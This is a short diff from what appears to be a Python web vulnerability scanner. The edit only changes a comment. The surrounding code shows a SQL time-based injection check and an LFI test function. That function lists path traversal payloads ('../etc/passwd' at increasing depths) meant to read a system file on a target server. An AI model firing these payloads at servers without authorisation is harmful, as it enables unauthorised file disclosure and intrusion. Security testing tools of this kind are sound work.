@@ -28,7 +28,7 @@ def sql_(url):
     else:
         print("[!] SQL time based failed.")
 
-# LFI 
+## LFI 
 def lfi_(url):
     print("\n[!] Testing LFI")
     payloads = ['../etc/passwd','../../etc/passwd','../../../etc/passwd','../../../../etc/passwd','../../../../../etc/passwd','../../../../../../etc/passwd','../../../../../../../etc/passwd','../../../../../../../../etc/passwd']
